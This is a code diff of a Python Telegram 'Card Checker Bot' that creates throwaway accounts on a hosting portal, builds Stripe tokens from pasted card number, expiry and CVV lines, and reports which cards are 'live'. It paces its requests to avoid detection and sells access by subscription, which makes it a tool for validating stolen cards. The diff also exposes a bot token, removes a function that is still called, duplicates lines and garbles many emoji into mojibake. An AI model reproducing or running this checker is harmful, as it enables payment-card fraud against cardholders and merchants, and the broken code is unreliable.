@@ -16,36 +16,6 @@ def generate_email(domain="necub.com"):
     prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
     return f"{prefix}@{domain}"
 
-# ==============================
-# BIN LOOKUP FUNCTION
-def get_card_info(card_number):
-    """Get card BIN information"""
-    try:
-        bin_number = str(card_number)[:6]
-        url = f"https://lookup.binlist.net/{bin_number}"
-        
-        headers = {
-            "Accept-Version": "3"
-        }
-        
-        response = requests.get(url, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            data = response.json()
-            return {
-                "BIN": bin_number,
-                "Scheme": data.get("scheme", "Unknown"),
-                "Type": data.get("type", "Unknown"),
-                "Brand": data.get("brand", "Unknown"),
-                "Country": data.get("country", {}).get("name", "Unknown"),
-                "Bank": data.get("bank", {}).get("name", "Unknown")
-            }
-        else:
-            return None
-    except Exception as e:
-        print(f"BIN lookup error: {e}")
-        return None
-
 # BOT TOKEN
 TOKEN = "7707283677:AAF0rE6MKt-HBq8_MfyQ00V28y_l3Tnu-HM"
 bot = telebot.TeleBot(TOKEN)
@@ -58,7 +28,7 @@ ADMIN_IDS = [5895491379]  # Your ID
 
 # CONTACT INFO
 CONTACT_INFO = {
-    'name': 'Mahmoud Saad 🥷🏻',
+    'name': 'Mahmoud Saad ðŸ¥·ðŸ»',
     'username': '@FastSpeedtest',
     'id': 5895491379
 }
@@ -463,22 +433,6 @@ def check_subscription(user_id):
     return False
 
 # ==============================
-# HELPER FUNCTION TO ESCAPE MARKDOWN
-def escape_markdown(text):
-    """Escape special characters for Telegram Markdown"""
-    if not text:
-        return "Unknown"
-    
-    # Characters that need escaping in Telegram Markdown
-    escape_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
-    
-    escaped_text = str(text)
-    for char in escape_chars:
-        escaped_text = escaped_text.replace(char, f'\\{char}')
-    
-    return escaped_text
-
-# ==============================
 # DASHBOARD FUNCTIONS
 def generate_dashboard(chat_id):
     s = stats.get(chat_id)
@@ -487,14 +441,12 @@ def generate_dashboard(chat_id):
 
     msg = "📊 **CARD CHECKER RESULTS**\n\n"
     if s.get('visa_checked'):
-        # Escape the card number for safe display
-        card_display = escape_markdown(s['visa_checked'])
-        msg += f"💳 **Current:** `{card_display}`\n"
-        msg += f"📌 **Status:** {escape_markdown(s.get('response', 'Processing...'))}\n\n"
+        msg += f"💳 **Current:** `{s['visa_checked']}`\n"
+        msg += f"📌 **Status:** {s.get('response', 'Processing...')}\n\n"
     else:
-        msg += f"📌 **Status:** {escape_markdown(s.get('response', 'Starting...'))}\n\n"
+        msg += f"📌 **Status:** {s.get('response', 'Starting...')}\n\n"
 
-    msg += "━━━━━━━━━━━━━━━━━━━\n\n"
+    msg += "━━━━━━━━━━━━━━━━━━━━\n\n"
     
     if s.get("lives"):
         msg += "💳 **Live Cards:**\n"
@@ -503,21 +455,17 @@ def generate_dashboard(chat_id):
                 card_number = card.split("|")[0]
                 card_info = get_card_info(card_number)
                 
-                # Escape the card for safe display
-                escaped_card = escape_markdown(card)
-                msg += f"`{escaped_card}`\n"
-                
                 if card_info:
-                    msg += f"🏦 **Bank:** {escape_markdown(card_info['Bank'])}\n"
-                    msg += f"🌍 **Country:** {escape_markdown(card_info['Country'])}\n"
-                    msg += f"💎 **Type:** {escape_markdown(card_info['Scheme'])} {escape_markdown(card_info['Type'])}\n"
-                    msg += f"🏷️ **Brand:** {escape_markdown(card_info['Brand'])}\n\n"
+                    msg += f"`{card}`\n"
+                    msg += f"🏦 **Bank:** {card_info['Bank']}\n"
+                    msg += f"🌍 **Country:** {card_info['Country']}\n"
+                    msg += f"💎 **Type:** {card_info['Scheme']} {card_info['Type']}\n"
+                    msg += f"🏷️ **Brand:** {card_info['Brand']}\n\n"
                 else:
-                    msg += "\n"
+                    msg += f"`{card}`\n\n"
             except Exception as e:
                 print(f"Card info error: {e}")
-                escaped_card = escape_markdown(card)
-                msg += f"`{escaped_card}`\n\n"
+                msg += f"`{card}`\n\n"
     
     return msg
 
@@ -563,8 +511,12 @@ def generate_admin_list():
     markup = InlineKeyboardMarkup(row_width=1)
     
     admins = get_all_admins()
+    """Generate admin management panel"""
+    markup = InlineKeyboardMarkup(row_width=1)
+    
+    admins = get_all_admins()
     if admins:
-        markup.add(InlineKeyboardButton("📋 Current Admins:", callback_data="none"))
+        markup.add(InlineKeyboardButton("📝 Current Admins:", callback_data="none"))
         for admin_id, username in admins:
             admin_text = f"👑 {username or 'No username'} ({admin_id})"
             if admin_id in ADMIN_IDS:
@@ -577,6 +529,7 @@ def generate_admin_list():
     )
     markup.add(InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
     return markup
+
 
 def generate_subscription_panel():
     """Generate subscription management panel"""
@@ -619,7 +572,7 @@ def run_check(chat_id):
     
     # Register new account
     if not register_account(email):
-        s["response"] = "❌ Account registration failed"
+        s["response"] = "âŒ Account registration failed"
         stats[chat_id] = s
         return
 
@@ -628,7 +581,7 @@ def run_check(chat_id):
     login_response = session.post("https://portal.budgetvm.com/auth/login", data=login_data)
     
     if login_response.status_code != 200:
-        s["response"] = "❌ Login failed"
+        s["response"] = "âŒ Login failed"
         stats[chat_id] = s
         return
 
@@ -643,16 +596,16 @@ def run_check(chat_id):
     session.post("https://portal.budgetvm.com/auth/googleAsk", data=google_data)
 
     if "ePortalv1" not in session.cookies.get_dict():
-        s["response"] = "❌ Login/GoogleAsk failed"
+        s["response"] = "âŒ Login/GoogleAsk failed"
         stats[chat_id] = s
         return
 
-    print(f"✅ Successfully logged in with: {email}")
+    print(f"âœ… Successfully logged in with: {email}")
     
     # Check cards with delay
     for i, card in enumerate(cards):
         if stop_flag.get(chat_id):
-            s["response"] = "ℹ️ Check stopped"
+            s["response"] = "â¹ï¸ Check stopped"
             stats[chat_id] = s
             break
 
@@ -663,32 +616,20 @@ def run_check(chat_id):
             card_number, exp_month, exp_year, cvc = card.split("|")
         except:
             s["cvv"] += 1
-            s["response"] = "❌ Invalid card format"
-            stats[chat_id] = s
-            # Update message after each card
-            try:
-                bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=messages[chat_id],
-                    text=generate_dashboard(chat_id),
-                    parse_mode="Markdown",
-                    reply_markup=generate_buttons(chat_id)
-                )
-            except Exception as e:
-                print("Edit error:", e)
+            s["response"] = "âŒ Invalid card format"
             continue
 
         # Add 15 second delay between card requests (except for first card)
         if i > 0:
-            print(f"⏳ Waiting 15 seconds before next card...")
+            print(f"â³ Waiting 15 seconds before next card...")
             for countdown in range(15, 0, -1):
                 if stop_flag.get(chat_id):
-                    s["response"] = "ℹ️ Check stopped"
+                    s["response"] = "â¹ï¸ Check stopped"
                     stats[chat_id] = s
                     return
                 time.sleep(1)
 
-        print(f"💥 Checking card {i+1}/{len(cards)}: {card_number[:4]}****{card_number[-4:]}")
+        print(f"🔥 Checking card {i+1}/{len(cards)}: {card_number[:4]}****{card_number[-4:]}")
 
         # Stripe Token
         muid, sid, guid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
@@ -703,7 +644,7 @@ def run_check(chat_id):
 
         if "id" not in resp_json:
             s["cvv"] += 1
-            s["response"] = "❌ Token creation failed"
+            s["response"] = "âŒ Token creation failed"
         else:
             token_id = resp_json["id"]
             card_response = session.post(
@@ -717,9 +658,7 @@ def run_check(chat_id):
             except:
                 s["unknown"] += 1
                 s["response"] = "❓ Unknown response"
-                stats[chat_id] = s
                 continue
-
             result = str(resp_json.get("result",""))
             if resp_json.get("success") is True:
                 s["approved"] += 1
@@ -737,7 +676,7 @@ def run_check(chat_id):
 
         stats[chat_id] = s
 
-        # Update message after each card
+        # Update message
         try:
             bot.edit_message_text(
                 chat_id=chat_id,
@@ -762,7 +701,7 @@ def send_welcome(message):
     
     if not check_subscription(user_id):
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
+        markup.add(InlineKeyboardButton("ðŸ'¬ Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
         
         bot.send_message(
             message.chat.id, 
@@ -787,7 +726,7 @@ def send_welcome(message):
             "🚀 **Card Checker Bot**\n"
             "💳 Use /check to start checking cards\n"
             "👑 Use Admin Panel for management\n\n"
-            "📋 **Commands:**\n"
+            "📝 **Commands:**\n"
             "• `/check` - Start card checking\n"
             "• `/admin` - Admin panel",
             parse_mode="Markdown",
@@ -803,7 +742,7 @@ def send_welcome(message):
             f"🚀 **Card Checker Bot**\n"
             f"✅ **Subscription Status:** Active\n"
             f"{sub_text}\n\n"
-            f"📋 **Commands:**\n"
+            f"📝 **Commands:**\n"
             f"• `/check` - Start card checking\n\n"
             f"💳 Ready to check your cards!",
             parse_mode="Markdown"
@@ -814,7 +753,7 @@ def admin_panel(message):
     user_id = message.from_user.id
     
     if not is_admin(user_id):
-        bot.send_message(message.chat.id, "🚫 Access denied! Admin only.")
+        bot.send_message(message.chat.id, "ðŸš« Access denied! Admin only.")
         return
     
     stats = get_user_stats()
@@ -839,7 +778,7 @@ def ask_for_cards(message):
     
     if not check_subscription(user_id):
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
+        markup.add(InlineKeyboardButton("ðŸ'¬ Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
         
         bot.send_message(
             message.chat.id, 
@@ -855,8 +794,8 @@ def ask_for_cards(message):
     bot.send_message(
         message.chat.id, 
         "💳 **Send your cards now!**\n\n"
-        "📋 **Format:** `4111111111111111|12|2025|123`\n\n"
-        "📄 **Options:**\n"
+        "📝 **Format:** `4111111111111111|12|2025|123`\n\n"
+        "🔄 **Options:**\n"
         "• Send as text (one per line)\n"
         "• Upload .txt file\n\n"
         "⚡ Ready to check your cards!",
@@ -1022,7 +961,7 @@ def add_sub_command(message):
     try:
         parts = message.text.split()
         if len(parts) < 3:
-            bot.reply_to(message, "📋 **Usage:** `/addsub [user_id] [hours/days]`\n\n**Examples:**\n• `/addsub 123456789 24h`\n• `/addsub 123456789 7d`")
+            bot.reply_to(message, "📝 **Usage:** `/addsub [user_id] [hours/days]`\n\n**Examples:**\n• `/addsub 123456789 24h`\n• `/addsub 123456789 7d`")
             return
             
         user_id = int(parts[1])
@@ -1136,13 +1075,13 @@ def callback_query(call):
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
             text="➕ **Add New Admin**\n\n"
-                 "📋 **Options:**\n"
+                 "📝 **Options:**\n"
                  "• Forward a message from the user\n"
                  "• Send their User ID directly\n\n"
                  "👤 Send the user information now:",
             parse_mode="Markdown"
         )
-        bot.answer_callback_query(call.id, "📋 Send user info to add as admin")
+        bot.answer_callback_query(call.id, "📝 Send user info to add as admin")
     
     elif call.data == "remove_admin":
         waiting_for_admin_action[user_id] = 'remove_admin'
@@ -1150,11 +1089,11 @@ def callback_query(call):
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
             text="➖ **Remove Admin**\n\n"
-                 "📋 Send the User ID of admin to remove:\n\n"
+                 "📝 Send the User ID of admin to remove:\n\n"
                  "⚠️ **Note:** Main admins cannot be removed.",
             parse_mode="Markdown"
         )
-        bot.answer_callback_query(call.id, "📋 Send user ID to remove admin")
+        bot.answer_callback_query(call.id, "📝 Send user ID to remove admin")
     
     elif call.data == "add_subscription":
         bot.edit_message_text(
@@ -1229,13 +1168,13 @@ def callback_query(call):
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
             text=f"💎 **Add {duration_text} Subscription**\n\n"
-                 f"📋 **Options:**\n"
+                 f"📝 **Options:**\n"
                  f"• Forward a message from the user\n"
                  f"• Send their User ID directly\n\n"
                  f"👤 Send the user information now:",
             parse_mode="Markdown"
         )
-        bot.answer_callback_query(call.id, f"📋 Send user ID for {duration_text} subscription")
+        bot.answer_callback_query(call.id, f"📝 Send user ID for {duration_text} subscription")
     
     # Admin info callbacks
     elif call.data.startswith("admin_info_"):
